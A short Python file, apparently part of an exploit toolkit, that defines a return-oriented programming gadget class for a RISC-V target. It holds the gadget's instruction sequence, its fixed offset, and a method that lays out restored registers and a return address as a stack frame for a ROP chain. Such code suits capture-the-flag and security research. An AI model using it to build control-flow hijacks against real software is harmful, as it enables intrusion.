from bf_parser.rop_gadgets_base_class import ROP_Gadget

class MovA0_S0(ROP_Gadget):
    '''
    ld ra, 0x38(sp)
    mv a0, s0
    ld s0, 0x30(sp)
    ld s1, 0x28(sp)
    ld s2, 0x20(sp)
    ld s3, 0x18(sp)
    ld s4, 0x10(sp)
    ld s5, 0x8(sp)
    ld s6, 0(sp)
    addi sp, sp, 0x40
    jr ra
    '''
    def __init__(self):
        super().__init__(0x2b7e2, 0x40)

    def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0, s4=0, s5=0, s6=0):
        data = [s6, s5, s4, s3, s2, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()